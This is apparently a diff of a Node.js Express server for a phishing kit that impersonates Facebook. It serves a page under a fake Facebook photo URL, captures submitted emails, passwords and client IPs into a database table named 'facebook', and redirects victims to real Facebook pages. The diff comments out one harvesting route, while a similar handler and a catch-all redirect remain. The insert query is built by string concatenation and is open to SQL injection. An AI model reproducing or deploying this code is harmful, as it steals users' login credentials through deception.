@@ -138,26 +138,26 @@ app.post('/confirm/fad', function (req,res) {
     })
 })
 // ***********************************************************************************************************************************************
-app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.22155908091201572697/7353064801971644', function (req, res) {
+// app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.22155908091201572697/7353064801971644', function (req, res) {
 
-    res.render('sina');
-})
-app.post('/confirm/sina', function (req,res) {
+//     res.render('sina');
+// })
+// app.post('/confirm/sina', function (req,res) {
 
 
-    res.redirect('https://www.facebook.com/groups/su180/')
-    var a = req.body.email_a;
-    var b = req.body.pass_a;
-    var c = req.body.email;
-    var d = req.body.pass;
-    var ip = req.headers['x-forwarded-for'] ||
-        req.connection.remoteAddress ||
-        req.socket.remoteAddress ||
-        (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
+//     res.redirect('https://www.facebook.com/groups/su180/')
+//     var a = req.body.email_a;
+//     var b = req.body.pass_a;
+//     var c = req.body.email;
+//     var d = req.body.pass;
+//     var ip = req.headers['x-forwarded-for'] ||
+//         req.connection.remoteAddress ||
+//         req.socket.remoteAddress ||
+//         (req.connection.socket ? req.connection.socket.remoteAddress : null);
+//     client.query("INSERT INTO facebook (mail_a,mail_b,MAIL,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
 
-    })
-})
+//     })
+// })
 // ************************************************************************************************************************************************
 app.get('*', function (req, res) {
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
